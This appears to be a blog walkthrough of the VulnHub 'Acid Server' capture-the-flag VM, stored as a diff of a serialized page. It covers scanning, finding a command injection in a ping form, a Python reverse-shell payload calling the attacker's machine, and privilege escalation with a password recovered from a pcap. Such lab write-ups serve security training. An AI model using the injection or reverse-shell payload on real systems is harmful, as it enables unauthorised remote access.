@@ -1,0 +1,182 @@
+1510132992
+a:2:{s:7:"content";s:9802:"<p><a href="https://www.vulnhub.com/" title="Vulnhub website">VulnHub</a> provides materials allowing anyone to gain practical hands-on experience with digital security, computer applications and network administration tasks. <code>Acid Server</code> is a vulnerable VM that will teach you how to exploit command injection to run a reverse shell.</p>
+<p>===</p>
+<h2>Find &amp; scan the machine</h2>
+<p>First things first, we can use <code>netdiscover</code> to find the machine&#8217;s IP address:</p>
+<pre><code class="language-text">root@kali:~# netdiscover -r 172.16.130.0/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 172.16.130.1    00:50:56:c0:00:08      1      60  VMware, Inc.                
+ 172.16.130.2    00:50:56:e4:b9:88      1      60  VMware, Inc.                
+ 172.16.130.130  00:0c:29:58:f6:b6      1      60  VMware, Inc.                
+ 172.16.130.254  00:50:56:f2:98:bb      1      60  VMware, Inc. </code></pre>
+<p><em>Note: <code>172.16.130.0/24</code> is the subnet used by VMware for the VMs.</em></p>
+<p>We quickly deduce that the VM IP address is <code>172.16.130.130</code>. Let&#8217;s switch to <code>nmap</code> to look for open ports.</p>
+<pre><code class="language-text">root@kali:~# nmap -p 1-65535 -A -T4 172.16.130.130
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-30 01:27 CEST
+Nmap scan report for 172.16.130.130
+Host is up (0.00055s latency).
+Not shown: 65534 closed ports
+PORT      STATE SERVICE VERSION
+33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+|_http-server-header: Apache/2.4.10 (Ubuntu)
+|_http-title: /Challenge
+MAC Address: 00:0C:29:58:F6:B6 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.55 ms 172.16.130.130
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds</code></pre>
+<p>There seems to be only one open port, <code>33447</code> used by <code>Apache 2.4.10</code>.</p>
+<h2>Taking a look at the webpage</h2>
+<p>We can access the webpage using the URL <code>http://172.16.130.130:33447/</code>.</p>
+<p><img title="Webpage" alt="WPG" src="/user/pages/01.home/VulnHub_Acid-Server/files/img/webpage.png" /></p>
+<p>The first hint I see is the sentence: <em>Fairy tails uses secret keys to open the magical doors.</em>. <em>Tales</em> is written as <em>tails</em>, let&#8217;s keep that in mind as there is a <code>tail</code> command that we might need to use later.</p>
+<p>Two more hints in the source code:</p>
+<pre><code class="language-text">line  7:    &lt;title&gt;/Challenge&lt;/title&gt;
+line 76:    &lt;!--0x643239334c6d70775a773d3d--&gt;</code></pre>
+<p><code>/Challenge</code> indicates a directory, going there shows a login page. </p>
+<p><img title="Login page" alt="LOG" src="/user/pages/01.home/VulnHub_Acid-Server/files/img/login_page.png" /></p>
+<p><code>0x643239334c6d70775a773d3d</code> is hexadecimal encoded data:</p>
+<pre><code class="language-text">root@kali:~# echo "643239334c6d70775a773d3d" | xxd -r -p
+d293LmpwZw==
+root@kali:~# echo "643239334c6d70775a773d3d" | xxd -r -p | base64 -d
+wow.jpg</code></pre>
+<p><code>/wow.jpg</code> doesn&#8217;t exist. Let&#8217;s keep that for later.</p>
+<h2>Find directories &amp; files</h2>
+<p>We use <code>dirbuster</code> to try to find subdirectories and files available on the webserver:</p>
+<p><img title="Dirbuster" alt="DIR" src="/user/pages/01.home/VulnHub_Acid-Server/files/img/dirbuster.png" /></p>
+<p>We also scan the <code>/Challenge</code> directory and look for files with the <code>html</code>, <code>php</code>, <code>js</code> and <code>txt</code> extensions. We might have got more files with a pure brute force or a better wordlist, but I didn&#8217;t want to spend too much time on that.</p>
+<pre><code class="language-text">/
+/Challenge/
+/Challenge/acid.txt
+/Challenge/cake.php
+/Challenge/css/
+/Challenge/css/style.css
+c/Challenge/error.php
+/Challenge/hacked.php
+/Challenge/include.php
+/Challenge/includes/
+/Challenge/includes/functions.php
+/Challenge/includes/logout.php
+/Challenge/index.php
+/Challenge/js/
+/Challenge/js/forms.js
+/Challenge/less/
+/Challenge/lol.css
+/Challenge/styles/
+/Challenge/styles/main.css
+/Challenge/todo.txt
+/css/
+/css/style.css
+/icons/
+/icons/small/
+/images/
+/index.html
+/server-status/</code></pre>
+<p>There&#8217;s a lot of hints hidden in the different pages, the most notable one is another directory given in the page <code>/Challenge/cake.php</code>:</p>
+<pre><code class="language-text">line 10:    &lt;title&gt;/Magic_Box&lt;/title&gt;</code></pre>
+<p>Let&#8217;s start another round of <code>dirbuster</code> on <code>/Challenge/Magic_Box</code>. We get very interesting results:</p>
+<pre><code class="language-text">/Challenge/Magic_Box/
+/Challenge/Magic_Box/command.php
+/Challenge/Magic_Box/low.php
+/Challenge/Magic_Box/proc/
+/Challenge/Magic_Box/proc/validate.php
+/Challenge/Magic_Box/tails.php</code></pre>
+<p>The page <code>/Challenge/Magic_Box/command.php</code> allows us to ping a IP address. The file named <code>tails.php</code> reminds us the typo <em>tales/tails</em> from the first webpage. </p>
+<h2>Command injection</h2>
+<p>The page <code>/Challenge/Magic_Box/command.php</code> allows us to ping a IP address. There is a vulnerability here as we can inject command by using the <code>;</code> character.</p>
+<pre><code class="language-text">Input:
+; ls
+
+Output:
+command.php
+command.php.save
+command2.php.save
+command2.php.save.1
+low.php
+proc
+tails.php</code></pre>
+<p><em>Note: the output is displayed on the page, we don&#8217;t have any shell yet.</em></p>
+<p>That&#8217;s pretty cool! We can access to what might be the source code of that page with the file <code>command.php.save</code>. The vulnerability we just exploited can be found that way:</p>
+<pre><code class="language-text">$cmd = shell_exec( 'ping  -c 3 ' . $target );
+
+Input:
+; ls
+Commands executed:
+ping  -c 3 ; ls</code></pre>
+<p>We notice that we can&#8217;t write in the current directory <code>/Challenge/Magic_Box</code>, however, we can write in the parent directory <code>/Challenge</code>.</p>
+<h2>Opening the magic doors</h2>
+<p>Let&#8217;s use that flaw to launch a reverse shell:</p>
+<p>We use <code>nc</code> on kali and listen on the port <code>1234</code>.</p>
+<pre><code class="language-text">root@kali:~# nc -l -p 1234</code></pre>
+<p>Now, we need to force the VM to connect to Kali. We can use this payload:</p>
+<pre><code class="language-text">; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.130.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+<p><em>Note: <code>172.16.130.128</code> is Kali&#8217;s IP and <code>1234</code> is the port aforementioned.</em></p>
+<pre><code class="language-text">root@kali:~# nc -l -p 1234
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@acid:/var/www/html/Challenge/Magic_Box$ </code></pre>
+<p>Hurray! Now we need to get root and get the flag!</p>
+<h2>The Culprit</h2>
+<p>We were stuck for a while on that last part and couldn&#8217;t find any lead. We can print <code>/etc/passwd</code> to find 2 users that might be interesting:</p>
+<pre><code class="language-text">acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
+saman:x:1001:1001:,,,:/home/saman:/bin/bash</code></pre>
+<p>Finally, we stumble into the file <code>/sbin/raw_vs_isi/hint.pcapng</code>. It&#8217;s a pcap file, with a strange TCP stream:</p>
+<pre><code class="language-text">&gt; heya
+&lt; hello
+&gt; what was the name of the Culprit ???
+&lt; saman and now a days he's known by the alias of 1337hax0r
+&gt; oh...Fuck....Great...Now, we gonna Catch Him Soon :D
+&lt; Yes .. We have to !! The mad bomber is on a rage
+&gt; Ohk...cya
+&lt; Over and Out</code></pre>
+<p><img title="TCP Stream" alt="TCP" src="/user/pages/01.home/VulnHub_Acid-Server/files/img/tcp_stream.png" /></p>
+<p>As simple as it might be, we can login as the user <code>saman</code>, with the password <code>1337hax0r</code>. </p>
+<pre><code class="language-text">www-data@acid:/var/www/html/Challenge/Magic_Box$ su saman
+su saman
+Password: 1337hax0r
+
+saman@acid:/var/www/html/Challenge/Magic_Box$ </code></pre>
+<p>And… this user can get root:</p>
+<pre><code class="language-text">saman@acid:/var/www/html/Challenge/Magic_Box$ sudo su       
+sudo su
+[sudo] password for saman: 1337hax0r
+
+  ____                            _         _       _   _                 
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/                                                   
+root@acid:/var/www/html/Challenge/Magic_Box# 
+</code></pre>
+<p>We can now get the flag!</p>
+<pre><code class="language-text">root@acid:~# cat flag.txt
+cat flag.txt
+
+Dear Hax0r,
+
+You have successfully completed the challenge.
+
+I  hope you like it.
+
+FLAG NAME: "Acid@Makke@Hax0r"
+
+Kind &amp; Best Regards
+
+-ACID
+facebook: https://facebook.com/m.avinash143
+</code></pre>";s:12:"content_meta";N;}
